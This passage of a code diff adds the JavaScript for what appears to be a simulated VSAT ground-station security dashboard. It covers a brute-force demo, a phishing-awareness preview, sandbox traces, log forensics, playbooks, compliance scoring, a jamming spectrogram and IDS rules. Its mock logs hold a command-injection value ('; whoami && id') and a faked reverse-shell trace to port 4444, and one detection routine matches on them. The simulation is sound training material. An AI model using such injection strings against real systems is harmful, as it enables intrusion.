+                    consoleBox.textContent += `\n[+] SUCCESS! Match verified over interface parameters.\n[+] VERDICT: Account Credentials found: 'admin' / '${found}'\n`;
+                    consoleBox.scrollTop = consoleBox.scrollHeight;
+                    showNotification("Security vulnerability verified. Weak credential detected.", "warning");
+                }
+            }, 400);
+        }
+
+        // Social Engineering Simulator (Element 6) Execution
+        function updatePhishingTemplatePreview() {
+            const selector = document.getElementById('se-template-selector').value;
+            const url = document.getElementById('se-landing-url').value;
+            const previewBox = document.getElementById('se-template-preview-box');
+
+            if (phishTemplates[selector]) {
+                previewBox.textContent = phishTemplates[selector].replace('{{URL}}', url);
+            }
+        }
+
+        function launchSocialEngSimulator() {
+            const destination = document.getElementById('se-landing-url').value;
+            showNotification(`Social awareness phishing assessment deployed pointing to redirect path: ${destination}`, 'success');
+        }
+
+        // Malware Sandbox Behavioral Simulator (Element 7) Execution
+        function runMalwareAnalysisSimulation() {
+            const file = document.getElementById('malware-bin-file').value;
+            const mode = document.getElementById('malware-sandbox-depth').value;
+            const consoleBox = document.getElementById('malware-sandbox-console');
+
+            consoleBox.textContent = `[*] Loading target binary executable: [${file}]\n[*] Environment Configuration: Isolated Sandbox MIPS Terminal\n`;
+
+            const steps = [
+                { log: `[*] Calculating cryptographic checksum hashes... MD5: a1c8e39023ff7763d`, time: 600 },
+                { log: `[*] Extracting embedded header metadata segments... ELF 32-bit MSB executable`, time: 1300 }
+            ];
+
+            if (mode === 'dynamic') {
+                steps.push(
+                    { log: `[*] Executing inside kernel trace container... tracing syscall routines:`, time: 2000 },
+                    { log: `[!] PROCESS TRACE: spawn() pid=12402 command='/bin/sh'`, time: 2600 },
+                    { log: `[!] NETWORK HOOK: socket() opened connection outbound to 10.122.44.18:4444`, time: 3200 },
+                    { log: `[!!!] CRITICAL: Payload contains active Trojan Horse remote shell scripts!`, time: 3800 }
+                );
+            } else {
+                steps.push(
+                    { log: `[*] Extracting ASCII printable text strings:`, time: 2000 },
+                    { log: `  ├─ "debug_console_password=V1asAtSeCr3t!"`, time: 2500 },
+                    { log: `  ├─ "root_bypass_flag=1"`, time: 3000 }
+                );
+            }
+
+            steps.forEach(step => {
+                setTimeout(() => {
+                    consoleBox.textContent += step.log + "\n";
+                    consoleBox.scrollTop = consoleBox.scrollHeight;
+                }, step.time);
+            });
+
+            setTimeout(() => {
+                showNotification("Sandbox behavioral verification completed successfully.", "success");
+            }, mode === 'dynamic' ? 4400 : 3600);
+        }
+
+        // Forensics log parser and playbooks (Element 8) Execution
+        function injectForensicsMockLogs() {
+            const input = document.getElementById('forensics-log-input');
+            input.value = `Jan 15 10:24:01 ground-router-HT2000 sshd[12402]: Failed password for invalid user admin from 10.122.44.18 port 49112 ssh2
+Jan 15 10:24:05 ground-router-HT2000 sshd[12402]: Failed password for invalid user admin from 10.122.44.18 port 49112 ssh2
+Jan 15 10:25:12 ground-router-HT2000 api-backend: [CVE-2024-6199] Command bypass sequence query detected: params='; whoami && id'
+Jan 15 10:25:13 ground-router-HT2000 kernel: [ALERT] Process uid 0 spawned raw shell from dynamic web application interface`;
+            showNotification("Mock syslogs successfully imported to forensics memory.", "info");
+        }
+
+        // Toggle configuration states from the Overview Quick Toggles
+        function toggleComplianceHardening(checkboxId) {
+            const chk = document.getElementById(checkboxId);
+            if (chk) {
+                chk.checked = !chk.checked;
+                calculateComplianceScore();
+                showNotification(`Remediation toggled: ${chk.checked ? 'ENABLED' : 'DISABLED'}`, chk.checked ? 'success' : 'warning');
+            }
+        }
+
+        function runForensicsAnalyzer() {
+            const logs = document.getElementById('forensics-log-input').value;
+            const alertBox = document.getElementById('forensics-result-alert');
+
+            if (!logs) {
+                showNotification("Log inputs are required for processing.", "error");
+                return;
+            }
+
+            alertBox.className = "p-4 rounded-lg text-xs space-y-2 mt-4 ";
+            
+            if (logs.includes("CVE-2024-6199") || logs.includes("whoami") || logs.includes("spawned raw shell")) {
+                alertBox.classList.add('bg-red-500/10', 'border-red-500/30', 'border', 'text-red-300');
+                alertBox.innerHTML = `
+                    <div class="font-bold">🛑 CRITICAL SECURITY ANOMALY MATCH FOUND</div>
+                    <p>Indicators suggest unauthenticated exploitation vectors matching CVE-2024-6199 signatures were executed on ground station HTTP interfaces. Host process execution of /bin/sh confirmed.</p>
+                `;
+                showNotification("Critical threat signature match identified!", "error");
+            } else if (logs.includes("Failed password")) {
+                alertBox.classList.add('bg-amber-500/10', 'border-amber-500/30', 'border', 'text-amber-300');
+                alertBox.innerHTML = `
+                    <div class="font-bold">⚠️ BRUTE FORCE ATTACK SUSPECTED</div>
+                    <p>Indicators: Multiple remote SSH authentication errors parsed. Review firewall logs for IP address: 10.122.44.18.</p>
+                `;
+                showNotification("Moderate threat warning logged.", "warning");
+            } else {
+                alertBox.classList.add('bg-emerald-500/10', 'border-emerald-500/30', 'border', 'text-emerald-300');
+                alertBox.innerHTML = `
+                    <div class="font-bold">✓ SECURITY INTEGRITY STABLE</div>
+                    <p>No anomalous patterns or exploitation indicators matching vsat_detection.py databases were parsed.</p>
+                `;
+                showNotification("System metrics verified secure.", "success");
+            }
+            alertBox.classList.remove('hidden');
+        }
+
+        function generatePlaybookIR() {
+            const vector = document.getElementById('forensics-vector-selector').value;
+            const output = document.getElementById('forensics-playbook-output');
+
+            let steps = "";
+            if (vector === 'cve-2024-6199') {
+                steps = `========================================================
+       CVE-2024-6199 CONTROLLER PLAYBOOK (v5)
+========================================================
+1. [CONTAIN] Disable HTTP external administration immediately.
+2. [ISOLATE] Pivot system configuration access strictly inside VLAN 40.
+3. [PATCH] Update firmware builds to stable package 5.2.1+.
+4. [ROTATE] Invalidate operational session cookies and SSH keys.`;
+            } else if (vector === 'cred-brute') {
+                steps = `========================================================
+     CREDENTIAL BRUTE FORCE CONTROL PLAYBOOK (v5)
+========================================================
+1. [FIREWALL] Drop connections from originating routing paths.
+2. [ENFORCE] Disable standard vendor passwords ('admin', 'viasat').
+3. [AUDIT] Check logs for successful session handshakes.
+4. [MFA] Apply multi-factor verification requirements.`;
+            } else {
+                steps = `========================================================
+     RF TELEMETRY DRIFT STABILIZATION PLAYBOOK (v5)
+========================================================
+1. [CARRIER] Cross-reference satellite transponder carrier locks.
+2. [SPECTRUM] Trigger spectrum filtering algorithms on local modems.
+3. [DOPPLER] Read receiver orbital tracker metrics for offsets.
+4. [ROUTING] Failover critical traffic over backup terrestrial circuits.`;
+            }
+
+            output.textContent = steps;
+            showNotification("IR steps compiled successfully.", "success");
+        }
+
+        // Automated Reporting Systems (Element 9) Executive Compiler
+        function compileExecutiveReport() {
+            const client = document.getElementById('report-client-type').value;
+            const auth = document.getElementById('report-auth-code').value;
+            const standard = document.getElementById('report-compliance-type').value;
+            const preview = document.getElementById('report-preview-box');
+
+            preview.textContent = `================================================================================
+             VSAT SYSTEM HARDENING AND ASSESSMENT COMPLIANCE REPORT
+================================================================================
+Report Code Reference   : ${auth}
+Standard Verification   : ${standard}
+Ground Client Domain    : ${client}
+Compiled Timestamp      : ${new Date().toISOString()}
+
+TECHNICAL DOCUMENT EXECUTIVE SUMMARY:
+Based on automated vulnerability scan algorithms (Vulnerability Scanners) and 
+dynamic sandbox behavior tracing (Malware Analysis), an administrative safety posturing 
+assessment was compiled.
+
+IDENTIFIED VULNERABILITY MATRIX:
+1. CVE-2024-6199: High-severity command substitution bug in modem interface.
+2. Default SNMP community access parameters allowed remote administrative reads.
+3. Raw log entries tracked active terminal brute forcing attempts from IP: 10.122.44.18.
+
+MITIGATION ARCHITECTURE PLAN:
+- Segregate satellite management interface paths into private, VLAN isolated zones.
+- Deploy strict encryption standards across web APIs using modern TLS protocols.
+- Rotate vendor-packaged administration credentials across all assets immediately.
+
+================================================================================
+                [AUTHENTICATED BINDING HASH INCLUDED]
+================================================================================`;
+
+            showNotification("Automated audit document generated.", "success");
+        }
+
+        // Responsive Canvas Sizing
+        function resizeCanvasToContainer() {
+            if (appState.canvasElement) {
+                const container = appState.canvasElement.parentElement;
+                appState.canvasElement.width = container.clientWidth;
+                appState.canvasElement.height = 180;
+            }
+        }
+
+        // Telemetry Waveform Render Loop
+        function drawTelemetryGraph() {
+            const ctx = appState.canvasContext;
+            const canvas = appState.canvasElement;
+            if (!ctx || !canvas) return;
+
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            const length = appState.telemetryData.snr.length;
+            const stepWidth = canvas.width / (length - 1);
+
+            // Shift telemetries
+            appState.telemetryData.snr.shift();
+            appState.telemetryData.doppler.shift();
+            appState.telemetryData.jitter.shift();
+            appState.telemetryData.freq.shift();
+
+            let snrVal, dopplerVal, jitterVal, freqVal;
+            if (appState.signalAnomalyActive) {
+                snrVal = 4 + Math.random() * 2;
+                dopplerVal = 45 + Math.random() * 15;
+                jitterVal = 85 + Math.random() * 30;
+                freqVal = 10.8 + Math.random() * 0.5;
+
+                document.getElementById('telemetry-snr').textContent = `${snrVal.toFixed(1)} dB`;
+                document.getElementById('telemetry-snr').className = "text-lg font-mono font-bold text-red-500 animate-pulse";
+                document.getElementById('telemetry-doppler').textContent = `+${dopplerVal.toFixed(1)} Hz`;
+                document.getElementById('telemetry-doppler').className = "text-lg font-mono font-bold text-red-500 animate-pulse";
+                document.getElementById('telemetry-jitter').textContent = `${Math.floor(jitterVal)} ms`;
+                document.getElementById('telemetry-jitter').className = "text-lg font-mono font-bold text-red-500 animate-pulse";
+                document.getElementById('telemetry-freq').textContent = `${freqVal.toFixed(2)} GHz`;
+                document.getElementById('telemetry-freq').className = "text-lg font-mono font-bold text-red-500 animate-pulse";
+            } else {
+                snrVal = 14 + Math.random() * 1.5;
+                dopplerVal = 4 + Math.random() * 2;
+                jitterVal = 10 + Math.random() * 2;
+                freqVal = 11.5;
+
+                document.getElementById('telemetry-snr').textContent = `${snrVal.toFixed(1)} dB`;
+                document.getElementById('telemetry-snr').className = "text-lg font-mono font-bold text-cyan-400";
+                document.getElementById('telemetry-doppler').textContent = `+${dopplerVal.toFixed(1)} Hz`;
+                document.getElementById('telemetry-doppler').className = "text-lg font-mono font-bold text-cyan-400";
+                document.getElementById('telemetry-jitter').textContent = `${Math.floor(jitterVal)} ms`;
+                document.getElementById('telemetry-jitter').className = "text-lg font-mono font-bold text-cyan-400";
+                document.getElementById('telemetry-freq').textContent = `${freqVal.toFixed(2)} GHz`;
+                document.getElementById('telemetry-freq').className = "text-lg font-mono font-bold text-cyan-400";
+            }
+
+            appState.telemetryData.snr.push(snrVal);
+            appState.telemetryData.doppler.push(dopplerVal);
+            appState.telemetryData.jitter.push(jitterVal);
+            appState.telemetryData.freq.push(freqVal);
+
+            // Plot Waveforms
+            plotTelemetryLine(ctx, appState.telemetryData.snr, '#06b6d4', stepWidth, canvas.height, 1.5, 2, 20);
+            plotTelemetryLine(ctx, appState.telemetryData.doppler, '#8b5cf6', stepWidth, canvas.height, 1.5, 4, 3);
+            plotTelemetryLine(ctx, appState.telemetryData.jitter, '#ef4444', stepWidth, canvas.height, 1.5, 6, 1);
+
+            requestAnimationFrame(drawTelemetryGraph);
+        }
+
+        function plotTelemetryLine(ctx, dataset, color, stepWidth, height, lineWidth, factor, multiplier) {
+            ctx.beginPath();
+            ctx.strokeStyle = color;
+            ctx.lineWidth = lineWidth;
+            
+            for (let i = 0; i < dataset.length; i++) {
+                const x = i * stepWidth;
+                const y = height - (dataset[i] * multiplier) - (factor * 10);
+                if (i === 0) {
+                    ctx.moveTo(x, y);
+                } else {
+                    ctx.lineTo(x, y);
+                }
+            }
+            ctx.stroke();
+        }
+
+        function triggerSignalAnomalies(state) {
+            appState.signalAnomalyActive = state;
+            if (state) {
+                showNotification("RF Telemetry Anomaly Injected! Signal degradation simulated.", "warning");
+            } else {
+                showNotification("Carrier loop stabilized. Normal telemetry parameters restored.", "success");
+            }
+        }
+
+        // NSA Compliance Dashboard Scoring Matrix
+        function calculateComplianceScore() {
+            const checkBoxes = document.querySelectorAll('.compliance-chk');
+            let checkedCount = 0;
+            checkBoxes.forEach(chk => {
+                if (chk.checked) checkedCount++;
+            });
+
+            const score = Math.round((checkedCount / checkBoxes.length) * 100);
+
+            // Update score badges
+            document.getElementById('stat-compliance-score').textContent = `${score}%`;
+            document.getElementById('compliance-percentage-text').textContent = `${score}%`;
+
+            const badge = document.getElementById('stat-compliance-badge');
+            const ratingText = document.getElementById('compliance-text-rating');
+            const ring = document.getElementById('compliance-svg-ring');
+
+            // Apply global configurations
+            appState.secureSnmp = document.getElementById('chk-secure-creds').checked;
+            appState.enforceHttps = document.getElementById('chk-enforce-https').checked;
+            appState.networkSegregated = document.getElementById('chk-network-seg').checked;
+            appState.codeSignatureEnforced = document.getElementById('chk-code-sig').checked;
+
+            // Sync text indicators on Overview Quick Panel
+            document.getElementById('quick-lbl-creds').textContent = appState.secureSnmp ? 'Secured (SNMPv3)' : 'Vulnerable (public)';
+            document.getElementById('quick-lbl-creds').className = `text-[10px] mt-2 font-mono uppercase ${appState.secureSnmp ? 'text-emerald-400 font-bold' : 'text-red-400'}`;
+            document.getElementById('quick-toggle-creds').className = `p-3 rounded-lg text-left transition-all flex flex-col justify-between border ${appState.secureSnmp ? 'bg-emerald-950/20 border-emerald-500/30' : 'bg-cyber-surface border-slate-800'}`;
+
+            document.getElementById('quick-lbl-https').textContent = appState.enforceHttps ? 'Enforced (HTTPS/TLS)' : 'Unencrypted (HTTP)';
+            document.getElementById('quick-lbl-https').className = `text-[10px] mt-2 font-mono uppercase ${appState.enforceHttps ? 'text-emerald-400 font-bold' : 'text-red-400'}`;
+            document.getElementById('quick-toggle-https').className = `p-3 rounded-lg text-left transition-all flex flex-col justify-between border ${appState.enforceHttps ? 'bg-emerald-950/20 border-emerald-500/30' : 'bg-cyber-surface border-slate-800'}`;
+
+            document.getElementById('quick-lbl-network').textContent = appState.networkSegregated ? 'Segregated (VLAN)' : 'Disabled (Flat WAN)';
+            document.getElementById('quick-lbl-network').className = `text-[10px] mt-2 font-mono uppercase ${appState.networkSegregated ? 'text-emerald-400 font-bold' : 'text-red-400'}`;
+            document.getElementById('quick-toggle-network').className = `p-3 rounded-lg text-left transition-all flex flex-col justify-between border ${appState.networkSegregated ? 'bg-emerald-950/20 border-emerald-500/30' : 'bg-cyber-surface border-slate-800'}`;
+
+            document.getElementById('quick-lbl-sig').textContent = appState.codeSignatureEnforced ? 'Active (Cryptographic)' : 'Disabled (Unsigned)';
+            document.getElementById('quick-lbl-sig').className = `text-[10px] mt-2 font-mono uppercase ${appState.codeSignatureEnforced ? 'text-emerald-400 font-bold' : 'text-red-400'}`;
+            document.getElementById('quick-toggle-sig').className = `p-3 rounded-lg text-left transition-all flex flex-col justify-between border ${appState.codeSignatureEnforced ? 'bg-emerald-950/20 border-emerald-500/30' : 'bg-cyber-surface border-slate-800'}`;
+
+            // Radius = 60. Circumference = 2 * Math.PI * 60 = 376.99
+            const circ = 376.99;
+            const offset = circ - (score / 100) * circ;
+            ring.style.strokeDashoffset = offset;
+
+            if (score === 100) {
+                badge.textContent = "SECURE";
+                badge.className = "text-xs bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded-md font-mono";
+                ratingText.textContent = "Posturing Status: Advanced Ground segment Hardened";
+                ratingText.className = "text-xs font-bold text-emerald-400";
+            } else if (score >= 50) {
+                badge.textContent = "MITIGATED";
+                badge.className = "text-xs bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded-md font-mono";
+                ratingText.textContent = "Posturing Status: Moderate Security Posture";
+                ratingText.className = "text-xs font-bold text-amber-400";
+            } else {
+                badge.textContent = "WEAK";
+                badge.className = "text-xs bg-red-500/10 text-red-400 px-2 py-0.5 rounded-md font-mono";
+                ratingText.textContent = "Posturing Status: Unacceptable System Security";
+                ratingText.className = "text-xs font-bold text-red-400";
+            }
+        }
+
+        // Display Scripts Code Blocks
+        function displayLibraryScript(key) {
+            const display = document.getElementById('library-code-display');
+            const title = document.getElementById('script-title');
+            const btns = document.querySelectorAll('.lib-btn');
+
+            const scriptTitles = {
+                'cve-rce': 'CVE-2024-6199 RCE Web Scanner (Python)',
+                'tr069': 'TR-069 Traffic Monitor (Python)',
+                'signal': 'RF Telemetry Baseline (Python)'
+            };
+
+            title.textContent = scriptTitles[key];
+            display.textContent = pythonCodeSnippets[key];
+
+            btns.forEach(btn => {
+                if (btn.getAttribute('onclick').includes(key)) {
+                    btn.className = "lib-btn w-full text-left text-xs p-2.5 rounded-lg bg-slate-950 border border-cyan-500/30 text-cyan-400 font-semibold";
+                } else {
+                    btn.className = "lib-btn w-full text-left text-xs p-2.5 rounded-lg hover:bg-slate-900 text-slate-400";
+                }
+            });
+        }
+
+        // Shared Clipboard and Export Utilities
+        function copyElementContent(id) {
+            const text = document.getElementById(id).textContent;
+            const inputTemp = document.createElement("textarea");
+            inputTemp.value = text;
+            document.body.appendChild(inputTemp);
+            inputTemp.select();
+            document.execCommand("copy");
+            document.body.removeChild(inputTemp);
+
+            showNotification("Information payload successfully saved to active clipboard.", "success");
+        }
+
+        function downloadReportElement(id, filename) {
+            const text = document.getElementById(id).textContent;
+            const blob = new Blob([text], {type: "text/plain;charset=utf-8"});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = filename;
+            a.click();
+            URL.revokeObjectURL(url);
+            showNotification(`Text document download initiated successfully: ${filename}`, "success");
+        }
+
+        // ==============================================================================
+        // ADVANCED TOOLS: ELEMENT 10 (RF SPECTROGRAM) & ELEMENT 11 (IDS RULES ENGINE)
+        // ==============================================================================
+
+        function initSpectrogramCanvas() {
+            appState.spectrogramCanvasElement = document.getElementById('spectrogram-canvas');
+            if (appState.spectrogramCanvasElement) {
+                appState.spectrogramContext = appState.spectrogramCanvasElement.getContext('2d');
+                appState.spectrogramCanvasElement.width = appState.spectrogramCanvasElement.parentElement.clientWidth;
+                appState.spectrogramCanvasElement.height = 180;
+                requestAnimationFrame(drawSpectrogramLoop);
+            }
+        }
+
+        function updateAttenuationLabel(val) {
+            document.getElementById('attenuation-val').textContent = `${val} dB`;
+            appState.spectralNoiseFactor = parseFloat(val) / 30;
+        }
+
+        function applyJammingSimulation() {
+            const profile = document.getElementById('jamming-profile').value;
+            const band = document.getElementById('jamming-band').value;
+            const status = document.getElementById('rf-spectral-status');
+
+            if (profile === 'none') {
+                status.textContent = `Spectral Health: Nominal (${band.toUpperCase()}-Band)`;
+                status.className = "text-emerald-400 font-mono";
+                showNotification("RF Jamming mitigated. Spectrum returning to nominal conditions.", "success");
+            } else {
+                status.textContent = `Spectral Health: CRITICAL JAMMING ACTIVE (${profile.toUpperCase()})`;
+                status.className = "text-red-400 font-mono animate-pulse";
+                showNotification(`Injected ${profile} jamming profile over ${band.toUpperCase()}-Band!`, "warning");
+            }
+        }
+
+        function drawSpectrogramLoop() {
+            const ctx = appState.spectrogramContext;
+            const canvas = appState.spectrogramCanvasElement;
+            if (!ctx || !canvas) return;
+
+            // Shift current frame up to simulate raw cascading spectrogram feed
+            const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            ctx.putImageData(imgData, 0, -1);
+
+            const bottomY = canvas.height - 1;
+            ctx.fillStyle = '#020617';
+            ctx.fillRect(0, bottomY, canvas.width, 1);
+
+            const profile = document.getElementById('jamming-profile') ? document.getElementById('jamming-profile').value : 'none';
+
+            for (let x = 0; x < canvas.width; x++) {
+                let intensity = Math.random() * 50;
+
+                // Swept chirp logic
+                if (profile === 'sweep') {
+                    const sweepCenter = (Date.now() / 10) % canvas.width;
+                    if (Math.abs(x - sweepCenter) < 15) intensity += 180;
+                }
+                // Comb carrier spikes
+                else if (profile === 'comb') {
+                    if (x % 60 === 0) intensity += 200;
+                }
+                // Noise saturation
+                else if (profile === 'barrage') {
+                    intensity += 150 + Math.random() * 50;
+                }
+
+                intensity = Math.min(255, intensity + (appState.spectralNoiseFactor * 100));
+
+                const red = Math.floor(intensity * 0.8);
+                const green = Math.floor(intensity * 0.2);
+                const blue = Math.floor(intensity);
+
+                ctx.fillStyle = `rgb(${red}, ${green}, ${blue})`;
+                ctx.fillRect(x, bottomY, 1, 1);
+            }
+
+            requestAnimationFrame(drawSpectrogramLoop);
+        }
+
+        function compileAndRegisterIDSRule() {
+            const action = document.getElementById('ids-rule-action').value;
+            const proto = document.getElementById('ids-rule-proto').value;
+            const content = document.getElementById('ids-rule-content').value;
+            const consoleBox = document.getElementById('ids-engine-console');
+
+            if (!content) {
+                showNotification("Rule requires a signature content pattern to match.", "error");
+                return;
+            }
+
+            const ruleObj = { action, proto, content };
+            appState.activeIDSRules.push(ruleObj);
+
+            document.getElementById('ids-rules-count').textContent = `Active Rules: ${appState.activeIDSRules.length}`;
+            consoleBox.textContent += `[+] Loaded rule: ${action.toUpperCase()} ${proto} -> match payload content: "${content}"\n`;
+            consoleBox.scrollTop = consoleBox.scrollHeight;
+
+            showNotification("IDS signature compiled and loaded into active kernel memory.", "success");
+            
+            triggerIDSLiveSimulation(ruleObj);
+        }
+
+        function triggerIDSLiveSimulation(rule) {
+            const consoleBox = document.getElementById('ids-engine-console');
+            setTimeout(() => {
+                consoleBox.textContent += `[*] Evaluator parsed stream segment... Matching rule content "${rule.content}"\n`;
+                if (Math.random() > 0.4) {
+                    consoleBox.textContent += `[!!!] MATCH SIGNATURE: ${rule.action.toUpperCase()} action taken on protocol ${rule.proto} containing "${rule.content}"!\n`;
+                }
+                consoleBox.scrollTop = consoleBox.scrollHeight;
+            }, 1200);
+        }
+
+        function clearActiveIDSRules() {
+            appState.activeIDSRules = [];
+            document.getElementById('ids-rules-count').textContent = "Active Rules: 0";
+            document.getElementById('ids-engine-console').textContent = "# IDS Kernel flushed. Rules table initialized to default empty.\n";
+            showNotification("Flushed active rule signatures.", "info");
+        }
+    </script>
+</body>
+</html>
